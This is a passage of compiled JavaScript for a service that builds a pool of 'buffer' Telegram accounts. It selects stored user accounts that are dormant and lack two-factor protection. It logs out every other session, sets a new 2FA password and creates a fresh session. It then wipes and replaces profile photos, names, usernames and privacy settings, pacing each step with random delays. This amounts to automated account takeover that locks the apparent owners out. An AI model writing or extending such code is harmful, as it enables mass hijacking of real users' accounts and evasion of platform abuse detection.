            else if (needed > 0 && window.days < mostUrgentPriority) {
                mostUrgentWindow = window.name;
                mostUrgentPriority = window.days;
            }
        }
        const totalNeededForCount = Math.max(0, this.MIN_TOTAL_BUFFER_CLIENTS - totalActive);
        const totalNeeded = Math.max(maxNeeded, totalNeededForCount);
        let priority = 100;
        if (maxNeeded > 0) {
            priority = mostUrgentPriority;
        }
        let calculationReason = '';
        if (maxNeeded > 0 && totalNeededForCount > 0) {
            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded}, total count needs ${totalNeededForCount}`;
        }
        else if (maxNeeded > 0) {
            const windowConfig = this.AVAILABILITY_WINDOWS.find(w => w.name === mostUrgentWindow);
            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded} to meet minimum of ${windowConfig?.minRequired || 'unknown'}`;
        }
        else if (totalNeededForCount > 0) {
            calculationReason = `Total count needs ${totalNeededForCount} to reach minimum of ${this.MIN_TOTAL_BUFFER_CLIENTS}`;
        }
        else {
            calculationReason = 'All windows satisfied';
        }
        return {
            totalNeeded,
            windowNeeds,
            totalActive,
            totalNeededForCount,
            calculationReason,
            priority
        };
    }
    async backfillTimestamps(mobile, doc, now) {
        const needsBackfill = !doc.privacyUpdatedAt || !doc.profilePicsDeletedAt ||
            !doc.nameBioUpdatedAt || !doc.usernameUpdatedAt ||
            !doc.profilePicsUpdatedAt;
        if (!needsBackfill) {
            this.logger.debug(`Skipping timestamp backfill for ${mobile} (already has all timestamps)`);
            return;
        }
        ;
        this.logger.log(`Backfilling timestamp fields for ${mobile}`);
        const allTimestamps = client_helper_utils_1.ClientHelperUtils.createBackfillTimestamps(now, this.ONE_DAY_MS);
        const backfillData = {};
        if (!doc.privacyUpdatedAt)
            backfillData.privacyUpdatedAt = allTimestamps.privacyUpdatedAt;
        if (!doc.profilePicsDeletedAt)
            backfillData.profilePicsDeletedAt = allTimestamps.profilePicsDeletedAt;
        if (!doc.nameBioUpdatedAt)
            backfillData.nameBioUpdatedAt = allTimestamps.nameBioUpdatedAt;
        if (!doc.usernameUpdatedAt)
            backfillData.usernameUpdatedAt = allTimestamps.usernameUpdatedAt;
        if (!doc.profilePicsUpdatedAt)
            backfillData.profilePicsUpdatedAt = allTimestamps.profilePicsUpdatedAt;
        await this.update(mobile, backfillData);
        this.logger.log(`Backfilled ${Object.keys(backfillData).length} timestamp fields for ${mobile}`);
    }
    async performHealthCheck(mobile, lastChecked, now) {
        const needsHealthCheck = !lastChecked || (now - lastChecked > 7 * this.ONE_DAY_MS);
        if (!needsHealthCheck) {
            this.logger.debug(`Health check not needed for ${mobile} (last checked: ${new Date(lastChecked).toISOString()})`);
            return true;
        }
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                autoDisconnect: false,
                handler: false,
            });
            await telegramClient.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [new telegram_1.Api.InputPrivacyValueDisallowAll()],
            }));
            const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, true);
            await this.update(mobile, {
                channels: channels.ids.length,
                lastChecked: new Date()
            });
            this.logger.debug(`Health check PASSED for ${mobile}`);
            await (0, Helpers_1.sleep)(5000);
            return true;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Health check failed', mobile);
            this.logger.warn(`Health check failed for ${mobile}: ${errorDetails.message}`);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(mobile, `Health check failed: ${errorDetails.message}`);
            }
            await (0, Helpers_1.sleep)(5000);
            return false;
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    getPendingUpdates(doc, now) {
        const accountAge = doc.createdAt ? now - new Date(doc.createdAt).getTime() : 0;
        const DAY = this.ONE_DAY_MS;
        const MIN_DAYS_BETWEEN_UPDATES = DAY;
        const reasons = [];
        const privacyTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.privacyUpdatedAt);
        const needsPrivacy = accountAge >= DAY &&
            (privacyTimestamp === 0 || privacyTimestamp < now - 15 * DAY);
        if (needsPrivacy)
            reasons.push('Privacy update needed');
        const privacyDone = privacyTimestamp > 0 && (now - privacyTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const photosDeletedTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsDeletedAt);
        const needsDeletePhotos = accountAge >= 2 * DAY &&
            (photosDeletedTimestamp === 0 || photosDeletedTimestamp < now - 30 * DAY) &&
            (privacyDone || privacyTimestamp === 0);
        if (needsDeletePhotos)
            reasons.push('Delete photos needed');
        const photosDone = photosDeletedTimestamp > 0 && (now - photosDeletedTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const nameBioTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.nameBioUpdatedAt);
        const needsNameBio = accountAge >= 3 * DAY &&
            (doc.channels || 0) > 100 &&
            (nameBioTimestamp === 0 || nameBioTimestamp < now - 30 * DAY) &&
            (photosDone || photosDeletedTimestamp === 0);
        if (needsNameBio)
            reasons.push('Name/Bio update needed');
        const nameBioDone = nameBioTimestamp > 0 && (now - nameBioTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const usernameTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.usernameUpdatedAt);
        const needsUsername = accountAge >= 7 * DAY &&
            (doc.channels || 0) > 150 &&
            (usernameTimestamp === 0 || usernameTimestamp < now - 30 * DAY) &&
            (nameBioDone || nameBioTimestamp === 0);
        if (needsUsername)
            reasons.push('Username update needed');
        const usernameDone = usernameTimestamp > 0 && (now - usernameTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const profilePicsTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsUpdatedAt);
        const needsProfilePhotos = accountAge >= 10 * DAY &&
            (doc.channels || 0) > 170 &&
            (profilePicsTimestamp === 0 || profilePicsTimestamp < now - 30 * DAY) &&
            (usernameDone || usernameTimestamp === 0);
        if (needsProfilePhotos)
            reasons.push('Profile photos update needed');
        const totalPending = [needsPrivacy, needsDeletePhotos, needsNameBio, needsUsername, needsProfilePhotos]
            .filter(Boolean).length;
        return {
            needsPrivacy,
            needsDeletePhotos,
            needsNameBio,
            needsUsername,
            needsProfilePhotos,
            totalPending,
            reasons
        };
    }
    async updatePrivacySettings(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            await telegramClient.updatePrivacyforDeletedAccount();
            await this.update(doc.mobile, {
                privacyUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            this.logger.debug(`Updated privacy settings for ${doc.mobile}`);
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return 1;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating privacy', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async deleteProfilePhotos(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const photos = await telegramClient.client.invoke(new telegram_1.Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));
            if (photos.photos.length > 0) {
                await telegramClient.deleteProfilePhotos();
                this.logger.debug(`Deleted ${photos.photos.length} profile photos for ${doc.mobile}`);
            }
            else {
                this.logger.debug(`No profile photos to delete for ${doc.mobile}`);
            }
            await this.update(doc.mobile, {
                profilePicsDeletedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return photos.photos.length > 0 ? 1 : 0;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error deleting photos', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async updateNameAndBio(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const me = await telegramClient.getMe();
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            let updateCount = 0;
            if (!(0, checkMe_utils_1.isIncludedWithTolerance)((0, checkMe_utils_1.safeAttemptReverse)(me.firstName), client.name)) {
                this.logger.log(`Updating name for ${doc.mobile} from ${me.firstName} to ${client.name}`);
                await telegramClient.updateProfile(`${(0, utils_1.obfuscateText)(client.name, {
                    maintainFormatting: false,
                    preserveCase: true,
                    useInvisibleChars: false
                })} ${(0, utils_1.getCuteEmoji)()}`, '');
                updateCount = 1;
            }
            await this.update(doc.mobile, {
                nameBioUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            this.logger.debug(`Updated name and bio for ${doc.mobile}`);
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return updateCount;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating profile', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async updateUsername(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const me = await telegramClient.getMe();
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            await this.telegramService.updateUsernameForAClient(doc.mobile, client.clientId, client.name, me.username);
            await this.update(doc.mobile, {
                usernameUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            this.logger.debug(`Updated username for ${doc.mobile}`);
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return 1;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating username', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async updateProfilePhotos(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const photos = await telegramClient.client.invoke(new telegram_1.Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));
            let updateCount = 0;
            if (photos.photos.length < 2) {
                await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
                await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                const photoPaths = ['dp1.jpg', 'dp2.jpg', 'dp3.jpg'];
                const randomPhoto = photoPaths[Math.floor(Math.random() * photoPaths.length)];
                await telegramClient.updateProfilePic(path_1.default.join(process.cwd(), randomPhoto));
                updateCount = 1;
                this.logger.debug(`Updated profile photo ${randomPhoto} for ${doc.mobile}`);
            }
            await this.update(doc.mobile, {
                profilePicsUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            await (0, Helpers_1.sleep)(40000 + Math.random() * 20000);
            return updateCount;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating profile photos', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await this.safeUnregisterClient(doc.mobile);
        }
    }
    async processBufferClient(doc, client) {
        if (doc.inUse === true) {
            this.logger.debug(`Buffer client ${doc.mobile} is marked as in use`);
            return 0;
        }
        if (!client) {
            this.logger.warn(`Client not found for buffer client ${doc.mobile}`);
            return 0;
        }
        const MIN_COOLDOWN_HOURS = 2;
        const MAX_FAILED_ATTEMPTS = 3;
        const FAILURE_RESET_DAYS = 7;
        const now = Date.now();
        let updateCount = 0;
        try {
            await (0, Helpers_1.sleep)(15000 + Math.random() * 10000);
            const failedAttempts = doc.failedUpdateAttempts || 0;
            const lastFailureTime = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUpdateFailure);
            if (failedAttempts > 0 && lastFailureTime > 0 && now - lastFailureTime > FAILURE_RESET_DAYS * this.ONE_DAY_MS) {
                this.logger.log(`Resetting failure count for ${doc.mobile} (last failure was ${Math.floor((now - lastFailureTime) / this.ONE_DAY_MS)} days ago)`);
                await this.update(doc.mobile, {
                    failedUpdateAttempts: 0,
                    lastUpdateFailure: null
                });
            }
            else if (failedAttempts >= MAX_FAILED_ATTEMPTS) {
                this.logger.warn(`Skipping ${doc.mobile} - too many failed attempts (${failedAttempts}). Will retry after ${FAILURE_RESET_DAYS} days.`);
                return 0;
            }
            const lastUpdateAttempt = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUpdateAttempt);
            if (lastUpdateAttempt > 0 && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {
                const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);
                this.logger.debug(`Client ${doc.mobile} on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);
                return 0;
            }
            const lastUsed = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUsed);
            if (lastUsed > 0 && now - lastUsed < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {
                this.logger.debug(`Client ${doc.mobile} recently used, skipping`);
                return 0;
            }
            if (lastUsed > 0) {
                await this.backfillTimestamps(doc.mobile, doc, now);
                this.logger.debug(`Client ${doc.mobile} has been used, assuming configured`);
                return 0;
            }
            const pendingUpdates = this.getPendingUpdates(doc, now);
            if (pendingUpdates.totalPending > 0) {
                this.logger.debug(`Client ${doc.mobile} has ${pendingUpdates.totalPending} pending updates: ${pendingUpdates.reasons.join(', ')}`);
            }
            else {
                this.logger.debug(`Client ${doc.mobile} has no pending updates - all complete!`);
            }
            if (pendingUpdates.needsPrivacy) {
                updateCount = await this.updatePrivacySettings(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsDeletePhotos) {
                updateCount = await this.deleteProfilePhotos(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsNameBio) {
                updateCount = await this.updateNameAndBio(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsUsername) {
                updateCount = await this.updateUsername(doc, client, failedAttempts);
                return updateCount;
            }
            if (pendingUpdates.needsProfilePhotos) {
                updateCount = await this.updateProfilePhotos(doc, client, failedAttempts);
                return updateCount;
            }
            if (updateCount === 0) {
                await this.update(doc.mobile, { lastUpdateAttempt: new Date() });
                if (pendingUpdates.totalPending > 0) {
                    this.logger.debug(`No updates performed for ${doc.mobile} despite ${pendingUpdates.totalPending} pending. Reasons: ${pendingUpdates.reasons.join(', ')}`);
                }
            }
            else {
                const remainingPending = pendingUpdates.totalPending - updateCount;
                if (remainingPending > 0) {
                    this.logger.debug(`Client ${doc.mobile} still has ${remainingPending} pending updates`);
                }
                else {
                    this.logger.log(` Client ${doc.mobile} - ALL UPDATES COMPLETE!`);
                }
            }
            return updateCount;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error with client', doc.mobile);
            try {
                const failedAttempts = doc.failedUpdateAttempts || 0;
                await this.update(doc.mobile, {
                    lastUpdateAttempt: new Date(),
                    failedUpdateAttempts: failedAttempts + 1,
                    lastUpdateFailure: new Date()
                });
            }
            catch (updateError) {
                this.logger.warn(`Failed to track update attempt for ${doc.mobile}:`, updateError);
            }
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(doc.mobile, errorDetails.message);
            }
            return 0;
        }
        finally {
            await (0, Helpers_1.sleep)(15000 + Math.random() * 10000);
        }
    }
    async createBufferClientFromUser(document, targetClientId, availableDate) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(document.mobile, {
            autoDisconnect: false,
        });
        try {
            const hasPassword = await telegramClient.hasPassword();
            this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
            if (hasPassword) {
                this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                await this.updateUser2FAStatus(document.tgId, document.mobile);
                return false;
            }
            await telegramClient.removeOtherAuths();
            await (0, Helpers_1.sleep)(10000 + Math.random() * 10000);
            await telegramClient.set2fa();
            this.logger.debug('Waiting for setting 2FA');
            await (0, Helpers_1.sleep)(30000 + Math.random() * 30000);
            const channels = await this.telegramService.getChannelInfo(document.mobile, true);
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const newSession = await this.telegramService.createNewSession(document.mobile);
            const targetAvailableDate = availableDate || client_helper_utils_1.ClientHelperUtils.getTodayDateString();
            this.logger.debug(`Inserting Document for client ${targetClientId} with availableDate ${targetAvailableDate}`);
            const bufferClient = {
                tgId: document.tgId,
                session: newSession,
                mobile: document.mobile,
                lastUsed: null,
                availableDate: targetAvailableDate,
                channels: channels.ids.length,
                clientId: targetClientId,
                status: 'active',
                message: availableDate
                    ? 'Account successfully configured as buffer client - available immediately'
                    : 'Account successfully configured as buffer client',
            };
            await this.create(bufferClient);
            await this.updateUser2FAStatus(document.tgId, document.mobile);
            this.logger.log(`Created BufferClient for ${targetClientId} with availability ${targetAvailableDate}`);
            return true;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error processing client', document.mobile);
            this.logger.error(`Error processing buffer client ${document.mobile}: ${errorDetails.message}`);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                try {
                    await this.markAsInactive(document.mobile, errorDetails.message);
                }
                catch (markError) {
                    this.logger.error(`Failed to mark ${document.mobile} as inactive:`, markError);
                }
            }
            return false;
        }
        finally {
            await this.safeUnregisterClient(document.mobile);
            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds, clientsNeedingBufferClients = [], bufferClientsPerClient) {
        const clientNeedingBufferClientsDynamic = [];
        for (const clientId of clientsNeedingBufferClients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingBufferClientsDynamic.push({
                    clientId,
                    ...availabilityNeeds
                });
            }
        }
        clientNeedingBufferClientsDynamic.sort((a, b) => a.priority - b.priority);
        await this.addNewUserstoBufferClientsDynamic(badIds, goodIds, clientNeedingBufferClientsDynamic, bufferClientsPerClient);
    }
    async addNewUserstoBufferClientsDynamic(badIds, goodIds, clientsNeedingBufferClients, bufferClientsPerClient) {
        const threeMonthsAgo = client_helper_utils_1.ClientHelperUtils.getDateStringDaysAgo(this.INACTIVE_USER_CUTOFF_DAYS, this.ONE_DAY_MS);
        let totalNeeded = 0;
        for (const clientNeed of clientsNeedingBufferClients) {
            totalNeeded += clientNeed.totalNeeded;
        }
        totalNeeded = Math.min(totalNeeded, this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER);
        if (totalNeeded === 0) {
            this.logger.debug('No buffer clients needed - all availability windows and total count satisfied');
            return;
        }
        this.logger.debug(`Creating ${totalNeeded} new buffer clients (all with availableDate = today) ` +
            `to satisfy availability windows and total count requirements`);
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: threeMonthsAgo },
            totalChats: { $gt: 150 },
        }, { tgId: 1 }, totalNeeded + 5);
        const today = new Date().toISOString().split('T')[0];
        const assignmentQueue = [];
        for (const clientNeed of clientsNeedingBufferClients) {
            for (let i = 0; i < clientNeed.totalNeeded; i++) {
                assignmentQueue.push({
                    clientId: clientNeed.clientId,
                    priority: clientNeed.priority
                });
            }
        }
        let processedCount = 0;
        let assignmentIndex = 0;
        while (processedCount < totalNeeded &&
            documents.length > 0 &&
            assignmentIndex < assignmentQueue.length) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            const assignment = assignmentQueue[assignmentIndex];
            if (!assignment) {
                this.logger.debug('No more assignments needed');
                break;
            }
            try {
                const created = await this.createBufferClientFromUser(document, assignment.clientId, today);
                if (created) {
                    assignmentIndex++;
                    processedCount++;
                    this.logger.debug(`Created buffer client ${document.mobile} for ${assignment.clientId} ` +
                        `with availableDate = ${today} (available immediately, priority: ${assignment.priority})`);
                }
                else {
                    processedCount++;
                }
            }
            catch (error) {
                const errorDetails = this.handleError(error, 'Error creating client connection', document.mobile);
                this.logger.error(`Error creating connection for ${document.mobile}:`, errorDetails);
                await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                processedCount++;
            }
        }
        this.logger.log(` Dynamic batch completed: Created ${processedCount} new buffer clients ` +
            `(all with availableDate = ${today}, available immediately). ` +
            `System maintains availability windows and total count requirements.`);
    }
    async updateAllClientSessions() {
        const bufferClients = await this.findAll('active');
        for (let i = 0; i < bufferClients.length; i++) {
            const bufferClient = bufferClients[i];
            try {
                this.logger.log(`Creating new session for mobile: ${bufferClient.mobile} (${i + 1}/${bufferClients.length})`);
                const client = await connection_manager_1.connectionManager.getClient(bufferClient.mobile, {
                    autoDisconnect: false,
                    handler: true,
                });
                try {
                    const hasPassword = await client.hasPassword();
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await (0, Helpers_1.sleep)(20000 + Math.random() * 10000);
                        await client.set2fa();
                        await (0, Helpers_1.sleep)(60000 + Math.random() * 30000);
                    }
                    await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
                    const newSession = await this.telegramService.createNewSession(bufferClient.mobile);
                    await this.update(bufferClient.mobile, {
                        session: newSession,
                        lastUsed: null,
                        message: 'Session updated successfully',
                    });
                }
                catch (error) {
                    const errorDetails = this.handleError(error, 'Failed to create new session', bufferClient.mobile);
                    if ((0, isPermanentError_1.default)(errorDetails)) {
                        await this.update(bufferClient.mobile, {
                            status: 'inactive',
                            message: `Session update failed: ${errorDetails.message}`,
                        });
                    }
                }
                finally {
                    await this.safeUnregisterClient(bufferClient.mobile);
                    if (i < bufferClients.length - 1) {
                        await (0, Helpers_1.sleep)(15000 + Math.random() * 10000);
                    }
                }
            }
            catch (error) {
                const errorDetails = this.handleError(error, 'Error creating client connection', bufferClient.mobile);
                this.logger.error(`Error creating client connection for ${bufferClient.mobile}: ${errorDetails.message}`);
                if (i < bufferClients.length - 1) {
                    await (0, Helpers_1.sleep)(15000 + Math.random() * 10000);
                }
            }
        }
    }
    async getBufferClientsByClientId(clientId, status) {
        const filter = { clientId };
        if (status) {
            filter.status = status;
        }
        return this.bufferClientModel.find(filter).exec();
    }
    async getBufferClientDistribution() {
        const clients = await this.clientService.findAll();
        const now = new Date();
        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);
        const [totalBufferClients, unassignedBufferClients, activeBufferClients, inactiveBufferClients, assignedCounts, activeCounts, inactiveCounts, neverUsedCounts, recentlyUsedCounts,] = await Promise.all([
            this.bufferClientModel.countDocuments(),
            this.bufferClientModel.countDocuments({ clientId: { $exists: false } }),
            this.bufferClientModel.countDocuments({ status: 'active' }),
            this.bufferClientModel.countDocuments({ status: 'inactive' }),
            this.bufferClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null } } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.bufferClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.bufferClientModel.aggregate([
                { $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.bufferClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
            this.bufferClientModel.aggregate([
                {
                    $match: {
                        clientId: { $exists: true, $ne: null },
                        status: 'active',
                        lastUsed: { $gte: last24Hours },
                    },
                },
                { $group: { _id: '$clientId', count: { $sum: 1 } } },
            ]),
        ]);
        const assignedCountMap = new Map(assignedCounts.map((item) => [item._id, item.count]));
        const activeCountMap = new Map(activeCounts.map((item) => [item._id, item.count]));
        const inactiveCountMap = new Map(inactiveCounts.map((item) => [item._id, item.count]));
        const neverUsedCountMap = new Map(neverUsedCounts.map((item) => [item._id, item.count]));
        const recentlyUsedCountMap = new Map(recentlyUsedCounts.map((item) => [item._id, item.count]));
        const distributionPerClient = [];
        let clientsWithSufficient = 0;
        let clientsNeedingMore = 0;
        let totalNeeded = 0;
        for (const client of clients) {
            const assignedCount = assignedCountMap.get(client.clientId) || 0;
            const activeCount = activeCountMap.get(client.clientId) || 0;
            const inactiveCount = inactiveCountMap.get(client.clientId) || 0;
            const neverUsed = neverUsedCountMap.get(client.clientId) || 0;
            const usedInLast24Hours = recentlyUsedCountMap.get(client.clientId) || 0;
            const needed = Math.max(0, this.MIN_TOTAL_BUFFER_CLIENTS - activeCount);
            const status = needed === 0 ? 'sufficient' : 'needs_more';
            distributionPerClient.push({
                clientId: client.clientId,
                assignedCount,
                activeCount,
                inactiveCount,
                needed,
                status,
                neverUsed,
                usedInLast24Hours,
            });
            if (status === 'sufficient') {
                clientsWithSufficient++;
            }
            else {
                clientsNeedingMore++;
                totalNeeded += needed;
            }
        }
        const maxPerTrigger = this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER;
        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);
        return {
            totalBufferClients,
            unassignedBufferClients,
            activeBufferClients,
            inactiveBufferClients,
            distributionPerClient,
            summary: {
                clientsWithSufficientBufferClients: clientsWithSufficient,
                clientsNeedingBufferClients: clientsNeedingMore,
                totalBufferClientsNeeded: totalNeeded,
                maxBufferClientsPerTrigger: maxPerTrigger,
                triggersNeededToSatisfyAll: triggersNeeded,
            },
        };
    }
    async getBufferClientsByStatus(status) {
        return this.bufferClientModel.find({ status }).exec();
    }
    async getBufferClientsWithMessages() {
        return this.bufferClientModel
            .find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 })
            .exec();
    }
    async getLeastRecentlyUsedBufferClients(clientId, limit = 1) {
        return this.bufferClientModel
            .find({
            clientId,
            status: 'active',
            inUse: { $ne: true }
        })
            .sort({ lastUsed: 1, _id: 1 })
            .limit(limit)
            .exec();
    }
    async getNextAvailableBufferClient(clientId) {
        const clients = await this.getLeastRecentlyUsedBufferClients(clientId, 1);
        return clients.length > 0 ? clients[0] : null;
    }
    async getUnusedBufferClients(hoursAgo = 24, clientId) {
        const cutoffDate = new Date(Date.now() - hoursAgo * 60 * 60 * 1000);
        const filter = {
            status: 'active',
            inUse: { $ne: true },
            $or: [
                { lastUsed: { $lt: cutoffDate } },
                { lastUsed: { $exists: false } },
                { lastUsed: null },
            ],
        };
        if (clientId) {
            filter.clientId = clientId;
        }
        return this.bufferClientModel.find(filter).exec();
    }
    async getUsageStatistics(clientId) {
        const filter = { status: 'active' };
        if (clientId) {
            filter.clientId = clientId;
        }
        const now = new Date();
        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);
        const lastWeek = new Date(now.getTime() - 7 * this.ONE_DAY_MS);
        const [totalClients, neverUsed, usedInLast24Hours, usedInLastWeek, allClients,] = await Promise.all([
            this.bufferClientModel.countDocuments(filter),
            this.bufferClientModel.countDocuments({
                ...filter,
                $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }],
            }),
            this.bufferClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: last24Hours },
            }),
            this.bufferClientModel.countDocuments({
                ...filter,
                lastUsed: { $gte: lastWeek },
            }),
            this.bufferClientModel.find(filter, { lastUsed: 1, createdAt: 1 }).exec(),
        ]);
        let totalGap = 0;
        let gapCount = 0;
        for (const client of allClients) {
            if (client.lastUsed) {
                const gap = now.getTime() - new Date(client.lastUsed).getTime();
                totalGap += gap;
                gapCount++;
            }
        }
        const averageUsageGap = gapCount > 0 ? totalGap / gapCount / (60 * 60 * 1000) : 0;
        return {
            totalClients,
            neverUsed,
            usedInLast24Hours,
            usedInLastWeek,
            averageUsageGap,
        };
    }
    async markAsUsed(mobile, message) {
        const updateData = { lastUsed: new Date() };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
};
exports.BufferClientService = BufferClientService;
